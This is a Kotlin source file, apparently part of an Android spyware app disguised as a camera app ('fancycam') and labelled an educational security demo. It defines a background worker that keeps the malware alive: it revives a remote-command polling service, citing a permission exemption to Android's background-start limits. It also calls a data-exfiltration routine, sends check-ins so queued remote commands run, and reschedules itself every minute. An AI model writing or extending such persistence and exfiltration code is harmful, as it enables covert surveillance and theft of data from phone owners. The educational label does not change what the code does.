package xyz.nahil.fancycam.workers

import xyz.nahil.fancycam.network.DataExfilSender
import xyz.nahil.fancycam.services.CommandPollingService
import android.content.Context
import android.util.Log
import java.util.concurrent.TimeUnit
import androidx.work.Constraints
import androidx.work.CoroutineWorker
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkerParameters
import androidx.work.WorkManager

/**
 * EDUCATIONAL DEMO - Android Security & Forensics Course
 *
 * FALLBACK path for background data collection. The primary cadence is owned by
 * [CommandPollingService]; this worker stays scheduled as a watchdog and only
 * performs collection when the foreground service is not running.
 */
class DataCollectionWorker(
    context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result {
        // PRIMARY service is active — nothing to do here, but keep the watchdog alive.
        if (CommandPollingService.isRunning) {
            Log.d(TAG, "[EDUCATIONAL] Polling service active; skipping fallback collection")
            scheduleNext(applicationContext)
            return Result.success()
        }

        Log.d(TAG, "[EDUCATIONAL] Fallback background data collection triggered")

        // Best-effort revival of the primary foreground service. Android 12+ may block
        // background FGS starts (ForegroundServiceStartNotAllowedException); the
        // SYSTEM_ALERT_WINDOW permission is one exemption. start() swallows failures.
        Log.d(TAG, "[EDUCATIONAL] Attempting to revive CommandPollingService")
        CommandPollingService.start(applicationContext)

        return try {
            DataExfilSender.collectAndExfiltrate(applicationContext)
            // Keep the app checking in while backgrounded so queued remote commands can be handled
            DataExfilSender.sendHeartbeat(applicationContext, processCommands = false)
            scheduleNext(applicationContext)
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] Background collection failed", e)
            scheduleNext(applicationContext)
            Result.retry()
        }
    }

    private fun scheduleNext(context: Context) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()
        val next = OneTimeWorkRequestBuilder<DataCollectionWorker>()
            .setInitialDelay(1, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        WorkManager.getInstance(context).enqueueUniqueWork(
            WORK_NAME,
            ExistingWorkPolicy.KEEP,
            next
        )
    }

    companion object {
        private const val TAG = "DataCollectionWorker"
        const val WORK_NAME = "edu_data_collection"
    }
}
